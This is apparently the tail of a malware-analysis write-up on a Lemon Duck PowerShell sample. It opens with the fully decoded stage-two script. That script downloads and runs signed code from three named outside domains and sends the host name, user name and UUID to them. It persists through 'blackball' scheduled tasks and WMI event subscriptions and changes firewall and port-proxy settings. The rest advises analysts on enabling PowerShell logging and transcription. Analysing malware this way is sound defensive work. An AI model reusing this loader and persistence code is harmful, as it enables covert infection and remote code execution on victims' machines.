$tmps='function a($u){$d=[text.encoding]::utf8.getbytes((new-object IO.StreamReader([net.webrequest]::create($u).getresponse().getresponsestream())).readtoend());$c=$d.count;if($c -gt 173){$b=$d[173..$c];$p=New-Object Security.Cryptography.RSAParameters;$p.Modulus=[convert]::FromBase64String(''2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10='');$p.Exponent=0x01,0x00,0x01;$r=New-Object Security.Cryptography.RSACryptoServiceProvider;$r.ImportParameters($p);if($r.verifyData($b,(New-Object Security.Cryptography.SHA1CryptoServiceProvider),[convert]::FromBase64String(-join([char[]]$d[0..171])))){I`ex(-join[char[]]$b)}}}$url=''http://''+''U1''+''U2''+''/a.jsp'+$v+'?''+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join''*'');a($url)'$sa=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
function getRan(){return -join([char[]](48..57+65..90+97..122)|Get-Random -Count (6+(Get-Random)%6))}
$us=@('t.zz3r0.com','t.zker9.com','t.bb3u9.com')
$stsrv = New-Object -ComObject Schedule.Service
$stsrv.Connect()
try{
$doit=$stsrv.GetFolder("\").GetTask("blackball")
}catch{}
if(-not $doit){
	if($sa){
		schtasks /create /ru system /sc MINUTE /mo 120 /tn blackball /F /tr "blackball"
	} else {
		schtasks /create /sc MINUTE /mo 120 /tn blackball /F /tr "blackball"
	}
	foreach($u in $us){
		$i = [array]::IndexOf($us,$u)
		if($i%3 -eq 0){$tnf=''}
		if($i%3 -eq 1){$tnf=getRan}
		if($i%3 -eq 2){if($sa){$tnf='MicroSoft\Windows\'+(getRan)}else{$tnf=getRan}}
		$tn = getRan
		if($sa){
			schtasks /create /ru system /sc MINUTE /mo 60 /tn "$tnf\$tn" /F /tr "powershell -c PS_CMD"
		} else {
			schtasks /create /sc MINUTE /mo 60 /tn "$tnf\$tn" /F /tr "powershell -w hidden -c PS_CMD"
		}
		start-sleep 1
		$folder=$stsrv.GetFolder("\$tnf")
		$taskitem=$folder.GetTasks(1)
		foreach($task in $taskitem){
			foreach ($action in $task.Definition.Actions) {
				try{
					if($action.Arguments.Contains("PS_CMD")){	
						$folder.RegisterTask($task.Name, $task.Xml.replace("PS_CMD",$tmps.replace('U1',$u.substring(0,5)).replace('U2',$u.substring(5))), 4, $null, $null, 0, $null)|out-null
					}
				}catch{}
			}
		}
		start-sleep 1
		schtasks /run /tn "$tnf\$tn"
		start-sleep 5
	}
}try{
$doit1=Get-WMIObject -Class __EventFilter -NameSpace 'root\subscription' -filter "Name='blackball'"
}catch{}
if(-not $doit1){
    Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name="blackball";EventNameSpace="root\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";} -ErrorAction Stop
    foreach($u in $us){        $theName=getRan
        $wmicmd=$tmps.replace('U1',$u.substring(0,5)).replace('U2',$u.substring(5)).replace('a.jsp','aa.jsp')
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=(Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name="f"+$theName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";} -ErrorAction Stop);Consumer=(Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="c"+$theName;ExecutablePath="c:\windows\system32\cmd.exe";CommandLineTemplate="/c powershell -c $wmicmd"})}
        start-sleep 5    }
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" DisableCompression -Type DWORD -Value 1 ???Force}
cmd.exe /c netsh.exe firewall add portopening tcp 65529 SDNSdnetsh.exe interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53
netsh advfirewall firewall add rule name="deny445" dir=in protocol=tcp localport=445 action=block
netsh advfirewall firewall add rule name="deny135" dir=in protocol=tcp localport=135 action=blockschtasks /delete /tn Rtsa2 /F
schtasks /delete /tn Rtsa1 /F
schtasks /delete /tn Rtsa /F
```

# Bonus tips
Sometimes we as analyst might lazy doing this repetitive task which consist of decoding the multiple stages. Another cheat tips for analyst (also logging detection best practice concern) is enable the Powershell Module Logging, Script Block Logging and Trasncription.

Even though we had useful artifact of `ConsoleHost_History` located at `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`, which saves all of the commands that you type in the PowerShell console or in easy term, view the history of the PowerShell... the log does not have full visibility of the Powershell activity. Figure below shows the history command we ran:

![image](https://user-images.githubusercontent.com/56353946/227678337-d613e21d-bbc4-453d-9c5e-febc9df9eb3a.png)

Looking in the above figure, the visibility of this log only shows the history of command. Thus you might want to configure Powershell Logs properly and leverage full potential of the logging capabilities.

Under `Computer Configuration` > `Policies` > `Administrative Settings` > `Windows Components` > `Windows PowerShell` you will find the settings for enabling logging:

![image](https://user-images.githubusercontent.com/56353946/227671102-5a7a7451-081c-4ea4-b08b-af3b91539f90.png)

For details, you can refer [https://www.mandiant.com/resources/blog/greater-visibility](https://www.mandiant.com/resources/blog/greater-visibility) for more information.

Also, you might wanted to record all sessions of the Powershell transcript in a text file which can be useful reviewing the recorded log after executing your malware, or to track Powershell activities by the attacker.

Open Powershell as Administrator and execute this command:
```
$psLoggingPath = 'HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription'
New-ItemProperty -Path $psLoggingPath -Name "OutputDirectory" -Value (Join-Path ${Env:UserProfile} "Desktop\PS_Transcripts") -PropertyType String -Force | Out-Null
```

As a result of enabling the script block, our lemon duck script block is recorded:

![image](https://user-images.githubusercontent.com/56353946/227674861-87eea181-8575-4850-9e9c-e0a68bb0e7e4.png)

![image](https://user-images.githubusercontent.com/56353946/227674881-4b532f95-3832-4bcb-8a54-e6ded286a115.png)

![image](https://user-images.githubusercontent.com/56353946/227674904-a3f410fa-53de-4788-a7e6-e39cfca1fd2f.png)

![image](https://user-images.githubusercontent.com/56353946/227674967-7176a001-708e-4a09-8e1a-26a0164cbac1.png)

![image](https://user-images.githubusercontent.com/56353946/227675388-67c1daa7-2ef1-4fcf-963b-6f13c33dee34.png)

For Powershell transcript, this logs in text files were generated after the execution happens:

![image](https://user-images.githubusercontent.com/56353946/227677899-fcb36bdb-1820-4e28-a77e-32e0c590aaa5.png)

Hidden Powershell command also can be seen:

![image](https://user-images.githubusercontent.com/56353946/227678028-53560345-c936-4d2c-b4d9-3ffc844f6c94.png)

Now you have full visibility of the Powershell activities located at:
1. Console history: `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
2. Script block: `%SystemRoot%\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx`
3. Transcript: `%HOMEPATH%\Desktop\PS_Transcripts`




